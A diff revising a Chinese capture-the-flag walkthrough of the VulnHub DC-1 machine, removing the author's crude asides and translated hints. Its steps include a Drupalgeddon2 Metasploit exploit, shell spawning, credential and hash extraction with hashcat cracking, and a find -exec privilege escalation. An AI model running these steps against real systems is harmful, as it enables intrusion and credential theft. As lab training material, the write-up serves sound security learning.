@@ -163,7 +163,7 @@ run
 
 ![](../../../../../../assets/img/Security/安全资源/靶机/VulnHub/DC/DC1/2.png)
 
-可以看到成功弹回一个会话,这里使用 exploit/unix/webapp/drupal_drupalgeddon2 这个模块也可以成功,就不一一展示了
+可以看到成功弹回一个会话,这里使用 exploit/unix/webapp/drupal_drupalgeddon2 这个模块也可以成功
 
 获取 meterpreter 会话后，先整一个 cmd shell
 ```bash
@@ -172,7 +172,7 @@ shell
 
 ![](../../../../../../assets/img/Security/安全资源/靶机/VulnHub/DC/DC1/3.png)
 
-这狗日的回显执行命令真是麻烦,咱给他再整个正常交互式的 shell
+整个正常交互式的 shell
 ```bash
 python -c 'import pty; pty.spawn("/bin/bash")'
 export TERM=xterm
@@ -193,15 +193,14 @@ find / -name flag*
 
 ![](../../../../../../assets/img/Security/安全资源/靶机/VulnHub/DC/DC1/5.png)
 
-什么鬼,当前目录下就有1个，欸不对，怎么只找到1个，是权限不够吗，可恶啊 (╯‵□′)╯︵┻━┻
+当前目录下就有1个
 
-不管了先看看再说
 ```
 cat flag1.txt
 Every good CMS needs a config file - and so do you.
 ```
 
-cms 的配置文件有什么东西是吧,老子来啦ヾ(^▽^*)
+cms 的配置文件有什么东西
 
 ---
 
@@ -224,12 +223,6 @@ cat sites/default/settings.php
 ```
 Brute force and dictionary attacks aren't the only ways to gain access (and you WILL need access).What can you do with these credentials?
 ```
-机翻
-```
-暴力和字典攻击不是获得访问权限的唯一方法（并且你将需要访问权限）。这些凭证怎么办？
-```
-
-你问我拿凭证干嘛,废话当然要登上去看看啊
 
 ---
 
@@ -339,7 +332,7 @@ show tables;
 +-----------------------------+
 ```
 
-不用说了,这么大个 users 写在那了,还用找其他的吗,直接查询用户名密码
+查询用户名密码
 
 ```mysql
 select name,pass from users;
@@ -354,7 +347,7 @@ select name,pass from users;
 
 得到了密码的 hash 就得跑明文了,下面使用 hashcat 爆破
 
-当然你不能直接跑,兄弟,你得知道 Hash id `hashcat --help` 查看 hash 对照表
+当然不能直接跑,得知道 Hash id , `hashcat --help` 查看 hash 对照表
 ```bash
 root@kali:~# hashcat --help | grep "Drupal"
    7900 | Drupal7                                          | Forums, CMS, E-Commerce, Frameworks
@@ -381,7 +374,9 @@ pass01.txt 你的密码表
 
 ![](../../../../../../assets/img/Security/安全资源/靶机/VulnHub/DC/DC1/9.png)
 
-只跑出一个 MyPassword,真是不甘心,俺得想想办法,终于,我 google 到了 admin 的密码 53cr3t ,赶紧把它加到我的密码表里
+只跑出一个 MyPassword
+
+后面 google 到了 admin 的密码 53cr3t
 
 好,admin 的账号密码都有了,那么直接登录,可以看到 dashboard 里就有 flag3
 
@@ -390,16 +385,10 @@ pass01.txt 你的密码表
 ```
 Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow.
 ```
-机翻
-```
-特殊的 PERMS 可以帮助找到 passwd,但你需要 -exec 该命令来确定如何获取隐藏的内容。
-```
 
 ---
 
 # flag4
-
-passwd 还需要找吗,当我哈批是吧,昂
 
 ```bash
 cat /etc/passwd
@@ -416,29 +405,21 @@ Can you use this same method to find or access the flag in root?
 
 Probably. But perhaps it's not that easy.  Or maybe it is?
 ```
-机翻
-```
-你可以使用相同的方法在根目录中查找或访问 flag 吗？
-
-大概。但这并不是那么容易。也许是吧？
-```
 
 ---
 
 # flag5
 
-嘲讽我没有权限是吧,这就提权给你看
-
-这里使用 [LinEnum](https://github.com/rebootuser/LinEnum)
+这里使用 [LinEnum](https://github.com/rebootuser/LinEnum) 进行提权
 
 kali 下载
 ```bash
 git clone https://github.com/rebootuser/LinEnum.git
 ```
 
-这里下了一会发现速度太慢,不管了,就当我速度快好了,下完了使用 HTTP 服务传过去
+下完了使用 HTTP 服务传过去
 
-> 注: 如果 git速度太慢，请参考 [Misc-Plan](../../../../Plan/Misc-Plan.md#git) 中给 git 或终端走代理的方法
+> 注: 如果 git速度太慢，可以给 git 或终端走代理
 
 ```bash
 python -m SimpleHTTPServer 8080
@@ -459,7 +440,7 @@ bash LinEnum.sh
 
 ![](../../../../../../assets/img/Security/安全资源/靶机/VulnHub/DC/DC1/14.png)
 
-看到 find 没有,今天就让我提个痛快
+可以通过 find 进行提权
 ```bash
 find . -exec /bin/sh \; -quit
 ```
